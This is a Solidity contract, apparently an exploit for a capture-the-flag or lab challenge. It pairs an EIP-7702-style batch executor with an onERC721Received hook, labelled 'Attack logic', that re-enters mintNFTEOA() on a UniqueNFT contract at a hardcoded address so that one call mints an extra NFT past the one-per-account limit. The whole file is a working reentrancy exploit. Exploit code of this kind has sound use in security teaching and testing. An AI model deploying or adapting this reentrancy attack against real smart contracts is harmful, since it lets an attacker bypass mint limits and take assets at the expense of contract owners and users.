// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { UniqueNFT } from "./UniqueNFT.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SimpleDelegateContract is IERC721Receiver {
    event Executed(address indexed to, uint256 value, bytes data);

    struct Call {
        bytes data;
        address to;
        uint256 value;
    }

    // --- Attack logic ---
    UniqueNFT public constant uniqueNFT = UniqueNFT(0x618a25994cCBdd9724583d6d202339A7A0d1fA13);
    address public owner;
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRY = 1;

    // ERC721 Receiver hook
    function onERC721Received(
        address /*operator*/, 
        address /*from*/, 
        uint256 /*tokenId*/, 
        bytes calldata /*data*/
    ) external override returns (bytes4) {
        if (reentryCount < MAX_REENTRY) {
            reentryCount++;
            // Re-enter mintNFTEOA to mint a second NFT
            uniqueNFT.mintNFTEOA();
        }
        return this.onERC721Received.selector;
    }

    // --- Original logic ---
    function execute(Call[] memory calls) external payable {
        for (uint256 i = 0; i < calls.length; i++) {
            Call memory call = calls[i];
            (bool success, bytes memory result) = call.to.call{value: call.value}(call.data);
            require(success, string(result));
            emit Executed(call.to, call.value, call.data);
        }
    }

    receive() external payable {}
}